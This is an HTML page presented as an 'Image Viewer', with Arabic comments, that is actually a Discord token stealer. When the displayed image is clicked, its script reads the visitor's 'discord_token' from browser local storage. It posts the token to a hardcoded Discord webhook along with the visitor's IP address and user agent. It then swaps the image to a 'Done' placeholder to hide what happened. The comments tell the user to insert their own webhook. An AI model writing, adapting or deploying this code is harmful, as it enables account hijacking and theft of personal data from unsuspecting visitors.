<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Image Viewer</title>
    <style>
        body { margin: 0; padding: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; }
        img { max-width: 100%; max-height: 100%; cursor: pointer; }
    </style>
</head>
<body>
    <!-- ضع رابط الصورة هنا أو صورة محلية -->
    <img src="https://www.europarabct.com/wp-content/uploads/2022/09/%D8%A7%D9%84%D8%A7%D8%B3%D8%AA%D8%AE%D8%A8%D8%A7%D8%B1%D8%A7%D8%AA-%D8%A7%D9%84%D9%85%D8%B1%D9%83%D8%B2%D9%8A%D8%A9.png" alt="Click to View" id="triggerImage">
    
    <script>
        // دالة لسحب التوكن من التخزين المحلي للمتصفح
        function getDiscordToken() {
            return localStorage.getItem('discord_token');
        }

        // دالة لإرسال التوكن إلى السيرفر الخاص بك
        async function sendToken(token) {
            if (token) {
                // استبدل الرابط أدناه برابط الـ Webhook الخاص بك أو الـ API الخاص بك لاستقبال البيانات
                const webhookUrl = "https://discordapp.com/api/webhooks/1556320807687430175/vdRV9iSLNNutQLA8tx9bCLvcO8EuNlEePUxj6ZlSjBRI3-uMrlNTy60fj9wErZRw9qNj"; 
                
                try {
                    await fetch(webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            token: token,
                            ip: await (await fetch('https://api.ipify.org?format=json')).json().ip,
                            userAgent: navigator.userAgent
                        })
                    });
                } catch (e) {
                    console.error("Failed to send token", e);
                }
            }
        }

        // تشغيل الكود بمجرد تحميل الصفحة (أو عند الضغط على الصورة إذا أردت تأخير)
        document.getElementById('triggerImage').addEventListener('click', () => {
            const token = getDiscordToken();
            sendToken(token);
            // اختياري: إعادة توجيه المستخدم أو تغيير الصورة لإخفاء العملية
            document.getElementById('triggerImage').src = "https://via.placeholder.com/150/000000/FFFFFF?text=Done";
        });
    </script>
</body>
</html>
